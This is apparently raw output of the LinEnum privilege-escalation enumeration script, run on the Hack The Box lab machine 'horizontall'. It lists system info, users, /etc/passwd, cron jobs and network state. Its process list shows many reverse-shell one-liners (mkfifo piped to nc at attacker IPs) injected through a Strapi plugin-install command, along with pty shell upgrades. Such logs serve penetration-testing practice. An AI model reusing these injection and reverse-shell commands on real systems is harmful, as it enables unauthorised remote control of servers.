#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Tue Jan 11 01:24:01 UTC 2022                                                                                                           
                                                                                                                                       

### SYSTEM ##############################################
[-] Kernel information:
Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-154-generic (buildd@lcy01-amd64-011) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"
NAME="Ubuntu"
VERSION="18.04.5 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.5 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
horizontall


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             pts/0    10.10.14.6       Mon Aug 23 11:27:49 +0000 2021
developer        pts/0    192.168.1.15     Fri Jun  4 11:22:58 +0000 2021
strapi           pts/21   10.10.14.217     Tue Jan 11 01:05:50 +0000 2022


[-] Who else is logged on:
 01:24:01 up  9:34,  1 user,  load average: 0.08, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon) groups=1(daemon)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(developer) gid=1000(developer) groups=1000(developer)
uid=111(mysql) gid=113(mysql) groups=113(mysql)
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)


[-] It looks like we have some admin users:
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
strapi:x:1001:1001::/opt/strapi:/bin/sh


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root      root      4.0K May 25  2021 .
drwxr-xr-x 24 root      root      4.0K Aug 23 11:29 ..
drwxr-xr-x  8 developer developer 4.0K Aug  2 12:07 developer


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
SSH_CONNECTION=10.10.14.217 38438 10.10.11.105 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/tmp
XDG_SESSION_ID=42
USER=strapi
PWD=/tmp/...
HOME=/opt/strapi
LESSHISTFILE=-
SSH_CLIENT=10.10.14.217 38438 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/21
MAIL=/var/mail/strapi
TERM=xterm-256color
SHELL=/bin/sh
SHLVL=2
LOGNAME=strapi
XDG_RUNTIME_DIR=/run/user/1001
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env


ls: cannot access '/snap/bin': No such file or directory
[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
drwxr-xr-x 2 root root  4096 Aug 23 11:28 /bin
drwxr-xr-x 2 root root 12288 Aug 23 11:28 /sbin
drwxr-xr-x 2 root root 36864 Aug 23 11:29 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 24  2018 /usr/games
drwxr-xr-x 2 root root  4096 May 26  2021 /usr/local/bin
drwxr-xr-x 2 root root  4096 Aug  6  2020 /usr/local/games
drwxr-xr-x 2 root root  4096 Aug  6  2020 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Aug 23 11:28 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/bin/rbash
/bin/dash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK           022


[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Aug  3 21:16 .
drwxr-xr-x 99 root root 4096 Aug 23 11:29 ..
-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  6  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Aug  3 21:17 .
drwxr-xr-x 99 root root 4096 Aug 23 11:29 ..
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 11  2019 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 99 root root 4096 Aug 23 11:29 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 99 root root 4096 Aug 23 11:29 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  3 21:16 .
drwxr-xr-x 99 root root 4096 Aug 23 11:29 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Tue 2022-01-11 01:39:00 UTC  14min left    Tue 2022-01-11 01:09:05 UTC  15min ago    phpsessionclean.timer        phpsessionclean.service
Tue 2022-01-11 03:18:17 UTC  1h 54min left Mon 2022-01-10 16:25:16 UTC  8h ago       ua-messaging.timer           ua-messaging.service
Tue 2022-01-11 06:53:13 UTC  5h 29min left Mon 2022-01-10 15:49:26 UTC  9h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2022-01-11 07:45:27 UTC  6h left       Mon 2022-01-10 22:39:17 UTC  2h 44min ago apt-daily.timer              apt-daily.service
Tue 2022-01-11 16:04:15 UTC  14h left      Mon 2022-01-10 16:04:15 UTC  9h ago       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Tue 2022-01-11 22:39:21 UTC  21h left      Tue 2022-01-11 00:00:07 UTC  1h 23min ago motd-news.timer              motd-news.service
Mon 2022-01-17 00:00:00 UTC  5 days left   Mon 2022-01-10 15:49:26 UTC  9h ago       fstrim.timer                 fstrim.service

7 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.105  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:b927  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:b9:27  txqueuelen 1000  (Ethernet)
        RX packets 4037954  bytes 593780751 (593.7 MB)
        RX errors 0  dropped 74  overruns 0  frame 0
        TX packets 4212177  bytes 2003778887 (2.0 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5954819  bytes 983195369 (983.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5954819  bytes 983195369 (983.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
? (10.10.10.2) at 00:50:56:b9:64:63 [ether] on eth0


[-] Nameserver(s):
nameserver 1.1.1.1


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 eth0


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1838/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    


### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
strapi     1791  0.0  0.2  76648  4912 ?        Ss   Jan10   0:00 /lib/systemd/systemd --user
strapi     1827  0.2  2.5 889924 50816 ?        Ssl  Jan10   1:32 PM2 v4.5.6: God Daemon (/opt/strapi/.pm2)
strapi     1838  1.9  4.5 933564 91464 ?        Ssl  Jan10  11:25 node /usr/bin/strapi
strapi     4310  0.0  2.0 805264 40588 ?        Sl   Jan10   0:00 npm
strapi     4328  0.0  0.0   4640   900 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.79 9999 >/tmp/f)"
strapi     4329  0.0  0.0   4640   108 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.79 9999 >/tmp/f)"
strapi     4332  0.0  0.0   6328   780 ?        S    Jan10   0:00 cat /tmp/f
strapi     4333  0.0  0.0   4640   864 ?        S    Jan10   0:00 /bin/sh -i
strapi     4334  0.0  0.1  15724  2092 ?        S    Jan10   0:00 nc 10.10.16.79 9999
strapi     4384  0.0  0.3  39236  6796 ?        S    Jan10   0:00 python3 -c import pty; pty.spawn("/bin/bash")
strapi     4385  0.0  0.1  21364  3800 pts/0    Ss   Jan10   0:00 /bin/bash
strapi    22819  0.0  0.0   8452   776 pts/0    S+   Jan10   0:00 more out.txt
strapi    22862  0.0  1.9 805044 40312 ?        Sl   Jan10   0:00 npm
strapi    22880  0.0  0.0   4640   824 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.79 9999 >/tmp/f)"
strapi    22881  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.79 9999 >/tmp/f)"
strapi    22884  0.0  0.0   6328   788 ?        S    Jan10   0:00 cat /tmp/f
strapi    22885  0.0  0.0   4640   836 ?        S    Jan10   0:00 /bin/sh -i
strapi    22886  0.0  0.1  15724  2140 ?        S    Jan10   0:02 nc 10.10.16.79 9999
strapi    22905  0.0  0.3  39236  7156 ?        S    Jan10   0:03 python3 -c import pty; pty.spawn("/bin/bash")
strapi    22906  0.0  0.2  21496  5168 pts/1    Ss   Jan10   0:00 /bin/bash
strapi    23718  0.0  0.1  24160  3464 pts/1    S+   Jan10   0:00 ls --color=auto -lisaR
strapi    23719  0.0  0.0   8452   964 pts/1    S+   Jan10   0:00 more
strapi    23871  0.0  2.0 805288 40980 ?        Sl   Jan10   0:00 npm
strapi    23889  0.0  0.0   4640   824 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.79 9999 >/tmp/f)"
strapi    23890  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.79 9999 >/tmp/f)"
strapi    23893  0.0  0.0   6328   752 ?        S    Jan10   0:00 cat /tmp/f
strapi    23894  0.0  0.0   4640   896 ?        S    Jan10   0:00 /bin/sh -i
strapi    23895  0.0  0.1  15724  2248 ?        S    Jan10   0:00 nc 10.10.16.79 9999
strapi    23930  0.0  0.3  38980  6740 ?        S    Jan10   0:00 python3 -c import pty; pty.spawn("/bin/bash")
strapi    23931  0.0  0.2  21364  5100 pts/2    Ss+  Jan10   0:00 /bin/bash
strapi    27176  0.0  2.0 805048 40420 ?        Sl   Jan10   0:00 npm
strapi    27194  0.0  0.0   4640   860 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(ping 10.10.16.34)"
strapi    29437  0.0  2.0 805364 40536 ?        Sl   Jan10   0:00 npm
strapi    29455  0.0  0.0   4640   824 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    29456  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    29459  0.0  0.0   6328   800 ?        S    Jan10   0:00 cat /tmp/f
strapi    29460  0.0  0.0   4640   828 ?        S    Jan10   0:00 /bin/sh -i
strapi    29461  0.0  0.1  15724  2200 ?        S    Jan10   0:00 nc 10.10.16.34 4444
strapi    29581  0.0  0.3  34780  7504 ?        S    Jan10   0:00 python -c import pty; pty.spawn("/bin/bash")
strapi    29582  0.0  0.2  21364  5160 pts/3    Ss+  Jan10   0:00 /bin/bash
strapi    29711  0.0  2.0 804972 40740 ?        Sl   Jan10   0:00 npm
strapi    29729  0.0  0.0   4640   876 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    29730  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    29733  0.0  0.0   6328   756 ?        S    Jan10   0:00 cat /tmp/f
strapi    29734  0.0  0.0   4640   820 ?        S    Jan10   0:00 /bin/sh -i
strapi    29735  0.0  0.1  15724  2168 ?        S    Jan10   0:00 nc 10.10.16.34 4444
strapi    31267  0.0  2.0 805308 40976 ?        Sl   Jan10   0:00 npm
strapi    31285  0.0  0.0   4640   824 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 1337 >/tmp/f)"
strapi    31286  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 1337 >/tmp/f)"
strapi    31289  0.0  0.0   6328   824 ?        S    Jan10   0:00 cat /tmp/f
strapi    31290  0.0  0.0   4640   780 ?        S    Jan10   0:00 /bin/sh -i
strapi    31291  0.0  0.1  15724  2228 ?        S    Jan10   0:00 nc 10.10.14.174 1337
strapi    31338  0.0  0.3  34912  7396 ?        S    Jan10   0:00 python -c import pty; pty.spawn("/bin/bash")
strapi    31339  0.0  0.2  21496  5356 pts/4    Ss+  Jan10   0:00 /bin/bash
strapi    32457  0.0  2.0 805628 40948 ?        Sl   Jan10   0:00 npm
strapi    32475  0.0  0.0   4640   792 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    32476  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    32479  0.0  0.0   6328   800 ?        S    Jan10   0:00 cat /tmp/f
strapi    32480  0.0  0.0   4640   932 ?        S    Jan10   0:00 /bin/sh -i
strapi    32481  0.0  0.1  15724  2188 ?        S    Jan10   0:00 nc 10.10.16.34 4444
strapi    32660  0.0  2.0 805184 40500 ?        Sl   Jan10   0:00 npm
strapi    32678  0.0  0.0   4640   864 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    32679  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.34 4444 >/tmp/f)"
strapi    32682  0.0  0.0   6328   828 ?        S    Jan10   0:00 cat /tmp/f
strapi    32683  0.0  0.0   4640   780 ?        S    Jan10   0:00 /bin/sh -i
strapi    32684  0.0  0.1  15724  2164 ?        S    Jan10   0:00 nc 10.10.16.34 4444
strapi    32689  0.0  0.3  34780  7432 ?        S    Jan10   0:00 python -c import pty; pty.spawn("/bin/bash")
strapi    32690  0.0  0.2  21364  5172 pts/5    Ss+  Jan10   0:00 /bin/bash
strapi    34558  0.0  2.0 805400 40616 ?        Sl   Jan10   0:00 npm
strapi    34576  0.0  0.0   4640   932 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 6969 >/tmp/f)"
strapi    34577  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 6969 >/tmp/f)"
strapi    34580  0.0  0.0   6328   756 ?        S    Jan10   0:00 cat /tmp/f
strapi    34581  0.0  0.0   4640   836 ?        S    Jan10   0:00 /bin/sh -i
strapi    34582  0.0  0.1  15724  2268 ?        S    Jan10   0:00 nc 10.10.16.38 6969
strapi    34756  0.0  0.3  34780  7652 ?        S    Jan10   0:00 python -c import pty; pty.spawn("/bin/sh")
strapi    34757  0.0  0.0   4640   784 pts/8    Ss+  Jan10   0:00 /bin/sh
strapi    34844  0.0  2.0 805324 40580 ?        Sl   Jan10   0:00 npm
strapi    34862  0.0  0.0   4640   876 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 6969 >/tmp/f)"
strapi    34863  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 6969 >/tmp/f)"
strapi    34866  0.0  0.0   6328   784 ?        S    Jan10   0:00 cat /tmp/f
strapi    34867  0.0  0.0   4640   788 ?        S    Jan10   0:00 /bin/sh -i
strapi    34868  0.0  0.1  15724  2188 ?        S    Jan10   0:00 nc 10.10.16.38 6969
strapi    35023  0.0  0.3  34780  7384 ?        S    Jan10   0:00 python -c import pty; pty.spawn("/bin/sh")
strapi    35024  0.0  0.0   4640   864 pts/9    Ss+  Jan10   0:00 /bin/sh
strapi    35683  0.0  2.0 805120 40744 ?        Sl   Jan10   0:00 npm
strapi    35701  0.0  0.0   4640   788 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 2323 >/tmp/f)"
strapi    35702  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 2323 >/tmp/f)"
strapi    35706  0.0  0.0   4640   824 ?        S    Jan10   0:00 /bin/sh -i
strapi    35742  0.0  0.4  38976  9824 ?        S    Jan10   0:00 python3 -cimport pty;pty.spawn("/bin/bash")
strapi    35743  0.0  0.2  21364  5148 pts/6    Ss+  Jan10   0:00 /bin/bash
strapi    35841  0.0  2.0 804976 40984 ?        Sl   Jan10   0:00 npm
strapi    35859  0.0  0.0   4640   828 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 2323 >/tmp/f)"
strapi    35860  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 2323 >/tmp/f)"
strapi    35863  0.0  0.0   6328   860 ?        S    Jan10   0:00 cat /tmp/f
strapi    35864  0.0  0.0   4640   932 ?        S    Jan10   0:00 /bin/sh -i
strapi    35865  0.0  0.1  15724  2180 ?        S    Jan10   0:00 nc 10.10.14.138 2323
strapi    35870  0.0  0.4  38976  9748 ?        S    Jan10   0:00 python3 -cimport pty;pty.spawn("/bin/bash")
strapi    35871  0.0  0.2  21364  5004 pts/10   Ss+  Jan10   0:00 /bin/bash
strapi    35983  0.0  2.0 804984 40560 ?        Sl   Jan10   0:00 npm
strapi    36001  0.0  0.0   4640   892 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/sh -i 2>&1 | nc 10.10.14.198 1234 > /tmp/f)"
strapi    36002  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/sh -i 2>&1 | nc 10.10.14.198 1234 > /tmp/f)"
strapi    36005  0.0  0.0   6328   744 ?        S    Jan10   0:00 cat /tmp/f
strapi    36006  0.0  0.0   4640   780 ?        S    Jan10   0:00 /bin/sh -i
strapi    36007  0.0  0.1  15724  2216 ?        S    Jan10   0:00 nc 10.10.14.198 1234
strapi    36027  0.0  2.0 805004 40504 ?        Sl   Jan10   0:00 npm
strapi    36045  0.0  0.0   4640   876 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 2323 >/tmp/f)"
strapi    36046  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 2323 >/tmp/f)"
strapi    36049  0.0  0.0   6328   860 ?        S    Jan10   0:00 cat /tmp/f
strapi    36050  0.0  0.0   4640   836 ?        S    Jan10   0:00 /bin/sh -i
strapi    36051  0.0  0.1  15724  2068 ?        S    Jan10   0:00 nc 10.10.14.138 2323
strapi    36071  0.0  0.4  39108  9548 ?        S    Jan10   0:00 python3 -cimport pty;pty.spawn("/bin/bash")
strapi    36072  0.0  0.2  21364  5136 pts/11   Ss+  Jan10   0:00 /bin/bash
strapi    36137  0.0  0.0   4640   932 ?        S    Jan10   0:00 /bin/sh -i
strapi    36152  0.0  2.0 804908 40404 ?        Sl   Jan10   0:00 npm
strapi    36170  0.0  0.0   4640   820 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/sh -i 2>&1 | nc 10.10.14.198 1234 > /tmp/f)"
strapi    36171  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/sh -i 2>&1 | nc 10.10.14.198 1234 > /tmp/f)"
strapi    36174  0.0  0.0   6328   784 ?        S    Jan10   0:00 cat /tmp/f
strapi    36175  0.0  0.0   4640   864 ?        S    Jan10   0:00 /bin/sh -i
